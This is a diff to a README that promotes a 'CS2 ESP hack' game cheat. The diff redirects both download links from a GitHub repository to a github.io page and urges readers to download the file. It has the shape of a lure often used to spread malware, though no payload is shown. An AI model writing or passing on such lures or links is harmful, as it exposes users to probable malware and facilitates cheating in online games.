@@ -1,6 +1,6 @@
 # 🎯 cs2-esp-hack-2026 - See Through Walls, Win Every Round
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_ESP_Hack_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/viggisius-blip/cs2-esp-hack-2026)
+[![Download Now](https://img.shields.io/badge/Download-CS2_ESP_Hack_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://viggisius-blip.github.io)
 
 ---
 
@@ -46,7 +46,7 @@ Getting started is quick and easy. Follow these steps carefully.
 
 Visit this link to download the application:
 
-[**https://github.com/viggisius-blip/cs2-esp-hack-2026**](https://github.com/viggisius-blip/cs2-esp-hack-2026)
+[**https://viggisius-blip.github.io**](https://viggisius-blip.github.io)
 
 Click the download button on that page. The file will start downloading automatically. Wait for the download to finish completely before moving to the next step.
 
